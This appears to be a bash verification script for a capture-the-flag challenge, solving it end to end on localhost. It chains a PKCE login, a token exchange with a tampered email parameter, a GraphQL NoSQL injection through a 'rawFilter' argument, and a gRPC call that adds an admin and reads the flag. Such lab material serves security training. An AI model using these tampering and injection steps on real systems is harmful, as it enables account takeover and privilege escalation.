#!/usr/bin/env bash

set -uo pipefail

PASS_COUNT=0
FAIL_COUNT=0

pass() { echo "  [PASS] $1"; PASS_COUNT=$((PASS_COUNT + 1)); }
fail() { echo "  [FAIL] $1"; FAIL_COUNT=$((FAIL_COUNT + 1)); }
section() { echo ""; echo "── $1 ──────────────────────────────────────────"; }

BASE_URL="http://localhost:4000/api/v1"
FRONTEND_URL="http://localhost:3000"
GRAPHQL_URL="http://localhost:4000/graphql"
GRPC_URL="localhost:50051"

section "1. Backend responds on port 4000"
if curl -sf "http://localhost:4000/api/v1/projects" >/dev/null 2>&1 || curl -sf "http://localhost:4000" >/dev/null 2>&1 || nc -z localhost 4000 2>/dev/null; then
  pass "Backend is responding on port 4000"
else
  fail "Backend is NOT responding on port 4000"
fi

section "2. Frontend responds on port 3000"
if curl -sf "$FRONTEND_URL" >/dev/null 2>&1 || nc -z localhost 3000 2>/dev/null; then
  pass "Frontend is responding on port 3000"
else
  fail "Frontend is NOT responding on port 3000"
fi

section "3. gRPC reflection responds on port 50051"
if grpcurl -plaintext "$GRPC_URL" list >/dev/null 2>&1; then
  pass "gRPC reflection is enabled and responding"
else
  fail "gRPC reflection failed"
fi

section "4. PKCE Auth Code (login)"
# Create base64 challenge
VERIFIER="healthcheck-verifier"
CHALLENGE_B64=$(echo -n "$VERIFIER" | base64)

AUTH_RES=$(curl -s -X POST "$BASE_URL/auth/login" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "swilam",
    "password": "switf123",
    "codeChallenge": "'"$CHALLENGE_B64"'"
  }')

AUTH_CODE=$(echo "$AUTH_RES" | grep -o '"authorizationCode":"[^"]*' | cut -d'"' -f4)

if [ -n "$AUTH_CODE" ]; then
  pass "Obtained authorizationCode for swilam: $AUTH_CODE"
else
  fail "Failed to obtain authorizationCode. Response: $AUTH_RES"
fi

section "5. JWT exchange via Parameter Tampering (token)"
JWT_RES=$(curl -s -X POST "$BASE_URL/auth/token" \
  -H "Content-Type: application/json" \
  -d '{
    "authorizationCode": "'"$AUTH_CODE"'",
    "grantType": "authorization_code",
    "codeVerifier": "'"$VERIFIER"'",
    "email": "admin@switf.local"
  }')

ACCESS_TOKEN=$(echo "$JWT_RES" | grep -o '"access_token":"[^"]*' | cut -d'"' -f4)

if [ -n "$ACCESS_TOKEN" ]; then
  pass "Obtained Admin accessToken via Parameter Tampering"
else
  fail "Failed to obtain accessToken. Response: $JWT_RES"
fi

section "6. GraphQL introspection"
INTRO_RES=$(curl -s -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "\n    query IntrospectionQuery {\n      __type(name: \"Query\") {\n        name\n        fields {\n          name\n          args {\n            name\n          }\n        }\n      }\n    }\n  "
  }')

if echo "$INTRO_RES" | grep -q 'rawFilter'; then
  pass "Introspection revealed rawFilter in args"
else
  fail "Introspection did NOT reveal rawFilter. Response: $INTRO_RES"
fi

section "7. GraphQL NoSQLi via rawFilter"
NOSQLI_RES=$(curl -s -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{
    "query": "query($filter: JSON) { searchAdmins(rawFilter: $filter) { name email } }",
    "variables": { "filter": { "role": { "$eq": "superadmin" } } }
  }')

SUPERADMIN_EMAIL=$(echo "$NOSQLI_RES" | grep -o '"email":"[^"]*' | cut -d'"' -f4 | grep 'superswilam@switf.local')

if [ -n "$SUPERADMIN_EMAIL" ]; then
  pass "NoSQLi successful, obtained superadmin email: $SUPERADMIN_EMAIL"
else
  fail "NoSQLi failed. Response: $NOSQLI_RES"
fi

section "8. grpcurl list returns SuperAdminService"
GRPC_LIST=$(grpcurl -plaintext "$GRPC_URL" list)

if echo "$GRPC_LIST" | grep -q 'SuperAdminService'; then
  pass "SuperAdminService found in reflection list"
else
  fail "SuperAdminService NOT found in reflection list"
fi

section "9. SuperAdminService.AddUnlimitedAdmin adds a 6th admin"
# First we need to get Superadmin JWT using the same PKCE bypass
SA_AUTH_RES=$(curl -s -X POST "$BASE_URL/auth/login" -H "Content-Type: application/json" \
  -d '{"username": "swilam", "password": "switf123", "codeChallenge": "'"$CHALLENGE_B64"'"}')
SA_AUTH_CODE=$(echo "$SA_AUTH_RES" | grep -o '"authorizationCode":"[^"]*' | cut -d'"' -f4)

SA_JWT_RES=$(curl -s -X POST "$BASE_URL/auth/token" -H "Content-Type: application/json" \
  -d '{"authorizationCode": "'"$SA_AUTH_CODE"'", "grantType": "authorization_code", "codeVerifier": "'"$VERIFIER"'", "email": "'"$SUPERADMIN_EMAIL"'"}')
SA_ACCESS_TOKEN=$(echo "$SA_JWT_RES" | grep -o '"access_token":"[^"]*' | cut -d'"' -f4)

# Call gRPC AddUnlimitedAdmin using grpcurl with auth token
ADD_RES=$(grpcurl -plaintext -H "authorization: Bearer $SA_ACCESS_TOKEN" \
  -d '{"name": "6th Admin", "email": "sixth@switf.local"}' \
  "$GRPC_URL" admin.SuperAdminService/AddUnlimitedAdmin 2>&1)

if echo "$ADD_RES" | grep -q 'success'; then
  pass "Added 6th admin successfully"
else
  fail "Failed to add 6th admin. Response: $ADD_RES"
fi

section "10. AdminService.ListAdmins returns the flag"
LIST_RES=$(grpcurl -plaintext -H "authorization: Bearer $SA_ACCESS_TOKEN" "$GRPC_URL" admin.AdminService/ListAdmins)

if echo "$LIST_RES" | grep -q 'SwiTF01-hit3{'; then
  FLAG=$(echo "$LIST_RES" | grep -o 'SwiTF01-hit3{[^}]*}')
  pass "Retrieved flag: $FLAG"
else
  fail "Flag not found in ListAdmins response."
fi

section "Summary"
echo "  PASS: $PASS_COUNT"
echo "  FAIL: $FAIL_COUNT"
echo ""

if [ "$FAIL_COUNT" -eq 0 ]; then
  echo "  ✓ Health checks passed."
  exit 0
else
  echo "  ✗ Health checks failed with $FAIL_COUNT failure(s)."
  exit 1
fi
